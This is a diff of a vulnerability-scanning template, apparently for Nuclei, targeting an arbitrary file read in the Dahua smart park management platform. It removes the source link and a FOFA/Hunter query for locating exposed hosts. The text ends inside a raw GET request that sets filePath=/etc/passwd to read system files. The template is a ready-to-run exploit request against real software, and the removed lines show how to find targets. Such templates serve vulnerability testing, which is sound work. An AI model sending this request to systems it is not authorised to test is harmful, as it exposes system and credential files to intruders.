@@ -3,14 +3,8 @@ info:
   name: 大华智慧园区综合管理平台attachment_downloadAtt.action任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ec95e2f817b279f9718ae1ca84d01125
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ec95e2f817b279f9718ae1ca84d01125
-    fofa: + hunter:`app.name="Dahua 大华 智慧园区管理平台"`
 http:
 - raw:
   - 'GET /portal/attachment_downloadAtt.action?filePath=/etc/passwd HTTP/1.1
